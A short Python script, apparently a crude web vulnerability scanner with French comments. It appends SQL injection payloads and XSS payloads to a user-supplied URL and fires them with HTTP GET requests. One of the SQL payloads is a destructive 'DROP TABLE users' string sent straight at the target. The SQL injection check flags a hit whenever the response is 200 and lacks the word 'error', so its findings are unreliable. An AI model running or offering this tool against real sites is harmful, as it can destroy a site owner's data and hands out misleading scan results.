import requests
import colorama
from colorama import Fore

# Initialiser Colorama
colorama.init(autoreset=True)

def check_sql_injection(url):
    """Vérifie la vulnérabilité à l'injection SQL."""
    payloads = ["' OR '1'='1", "' OR '1'='2", "'; DROP TABLE users; --"]
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" not in response.text and response.status_code == 200:
            print(Fore.CYAN + f"Possible SQL Injection vulnerability found with payload: {payload}")
            return True
    return False

def check_xss(url):
    """Vérifie la vulnérabilité XSS."""
    payloads = ["<script>alert('XSS');</script>", "'><img src=x onerror=alert(1)>"]
    for payload in payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(Fore.CYAN + f"Possible XSS vulnerability found with payload: {payload}")
            return True
    return False

def scan(url):
    """Effectue un scan des vulnérabilités sur l'URL donnée."""
    print(Fore.CYAN + f"Scanning {url} for vulnerabilities...\n")
    
    if check_sql_injection(url):
        print(Fore.CYAN + "SQL Injection vulnerability detected.")
    else:
        print(Fore.CYAN + "No SQL Injection vulnerabilities found.")

    if check_xss(url):
        print(Fore.CYAN + "XSS vulnerability detected.")
    else:
        print(Fore.CYAN + "No XSS vulnerabilities found.")

def main():
    print(Fore.CYAN + "=== Vulnerability Scanner ===")
    url = input(Fore.CYAN + "Enter the URL to scan (e.g., http://example.com/page.php?id=1): ")

    # Effectuer le scan de vulnérabilités
    scan(url)

if __name__ == "__main__":
    main()
